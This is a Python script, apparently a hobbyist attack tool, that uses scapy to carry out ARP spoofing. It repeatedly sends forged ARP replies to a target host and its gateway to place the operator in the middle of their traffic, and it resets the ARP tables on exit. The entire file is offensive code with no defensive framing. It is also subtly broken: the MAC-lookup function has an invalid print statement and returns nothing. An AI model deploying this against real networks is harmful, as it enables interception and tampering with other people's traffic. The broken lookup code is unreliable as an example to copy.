from difflib import restore
import scapy.all as scapy
import time, sys


def get_mac(ip: str) -> str:
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    print(answered_list = [0][1].hwsrc)


def spoof(target_ip: str, spoof_ip: str) -> None:
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip: str, source_ip: str) -> None:
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = ''
gateway_ip = ''

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.\n')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
